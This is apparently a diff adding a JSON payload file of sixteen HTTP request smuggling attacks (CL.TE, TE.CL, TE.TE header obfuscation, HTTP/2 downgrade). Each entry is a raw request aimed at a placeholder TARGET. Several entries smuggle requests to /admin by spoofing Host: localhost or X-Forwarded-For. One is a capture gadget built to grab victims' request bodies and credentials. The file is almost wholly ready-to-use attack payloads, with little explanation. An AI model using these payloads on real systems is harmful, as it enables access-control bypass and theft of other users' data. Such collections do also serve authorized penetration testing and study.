@@ -1,0 +1,33 @@
+{
+  "meta": {
+    "name": "HTTP Request Smuggling",
+    "icon": "🚦",
+    "description": "HTTP request smuggling payloads for CL.TE, TE.CL, TE.TE, and HTTP/2 downgrade attacks. Exploits discrepancies between front-end proxy and back-end server in how they interpret request boundaries.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 16
+  },
+  "payloads": [
+    {"id":1,"code":"POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED","description":"CL.TE detection probe — front-end uses Content-Length, back-end uses chunked TE; SMUGGLED poisons next request","category":"cl-te","platform":["any"],"tags":["smuggling","cl-te","detection","probe"]},
+    {"id":2,"code":"POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\n\r\ne\r\nq=smuggling&x=\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nFoo: x","description":"CL.TE attack — smuggles a GET /404 request to confirm via 404 response on clean follow-up","category":"cl-te","platform":["any"],"tags":["smuggling","cl-te","attack","404-detection"]},
+    {"id":3,"code":"POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 116\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 10\r\n\r\nusername=a","description":"CL.TE admin access — smuggles internal request to /admin with Host: localhost","category":"cl-te","platform":["any"],"tags":["smuggling","cl-te","admin","host-override"]},
+
+    {"id":4,"code":"POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n7c\r\nGET /404 HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 144\r\n\r\nx=\r\n0\r\n\r\n","description":"TE.CL detection probe — front-end uses Transfer-Encoding, back-end uses Content-Length","category":"te-cl","platform":["any"],"tags":["smuggling","te-cl","detection","probe"]},
+    {"id":5,"code":"POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n1\r\na\r\n0\r\n\r\n","description":"TE.CL minimal probe — bare minimum chunked body to detect TE/CL discrepancy","category":"te-cl","platform":["any"],"tags":["smuggling","te-cl","minimal","probe"]},
+
+    {"id":6,"code":"Transfer-Encoding: chunked\r\nTransfer-Encoding: x","description":"TE.TE obfuscation header — dual TE headers where one is invalid; each server may pick different one","category":"te-te","platform":["any"],"tags":["smuggling","te-te","obfuscation","dual-header"]},
+    {"id":7,"code":"Transfer-Encoding:\tchunked","description":"TE with tab obfuscation — some parsers reject tab before 'chunked', others accept","category":"te-te","platform":["any"],"tags":["smuggling","te-te","tab","obfuscation"]},
+    {"id":8,"code":"Transfer-Encoding: xchunked","description":"TE value prefix obfuscation — front-end may ignore; back-end may partially parse","category":"te-te","platform":["any"],"tags":["smuggling","te-te","prefix","obfuscation"]},
+    {"id":9,"code":"Transfer-Encoding\r\n : chunked","description":"TE header line-fold obfuscation — HTTP/1.1 obsolete line folding creates parser discrepancy","category":"te-te","platform":["any"],"tags":["smuggling","te-te","line-fold","rfc-abuse"]},
+
+    {"id":10,"code":"POST / HTTP/2\r\nHost: TARGET\r\nContent-Length: 0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: TARGET\r\n\r\n","description":"H2.CL smuggling — HTTP/2 request with Content-Length 0 hides HTTP/1.1 request when downgraded","category":"h2-downgrade","platform":["any"],"tags":["smuggling","h2","http2","downgrade","cl"]},
+    {"id":11,"code":"POST / HTTP/2\r\nHost: TARGET\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n","description":"H2.TE smuggling — HTTP/2 with TE header (normally invalid in H2) triggers smuggling on downgrade","category":"h2-downgrade","platform":["any"],"tags":["smuggling","h2","http2","downgrade","te"]},
+
+    {"id":12,"code":"POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 68\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n","description":"Smuggle with X-Forwarded-For: 127.0.0.1 — access admin panel by appearing to come from localhost","category":"cl-te","platform":["any"],"tags":["smuggling","cl-te","xff","localhost","admin"]},
+    {"id":13,"code":"POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 200\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /capture HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 400\r\n\r\nusername=","description":"Request capture gadget — smuggles partial POST to capture victim's request body on the back-end","category":"cl-te","platform":["any"],"tags":["smuggling","cl-te","capture","credentials"]},
+
+    {"id":14,"code":"Content-Length: 6\r\nContent-Length: 5","description":"Duplicate Content-Length header — some servers use first, others last, enabling CL desync","category":"detection","platform":["any"],"tags":["smuggling","duplicate","content-length","detection"]},
+    {"id":15,"code":"GET / HTTP/1.1\r\nHost: TARGET\r\nConnection: keep-alive, X-Ignore-CL\r\nX-Ignore-CL: \r\nContent-Length: 5\r\n\r\nSMUGG","description":"CL smuggling via Connection header abuse — some proxies strip headers listed in Connection","category":"detection","platform":["any"],"tags":["smuggling","connection","header-strip","detection"]},
+    {"id":16,"code":"POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n7c\r\nGET /flag HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 150\r\n\r\nx=\r\n0\r\n\r\n","description":"CTF-style flag access smuggling — TE.CL to access /flag endpoint through proxy","category":"te-cl","platform":["any"],"tags":["smuggling","te-cl","ctf","flag"]}
+  ]
+}
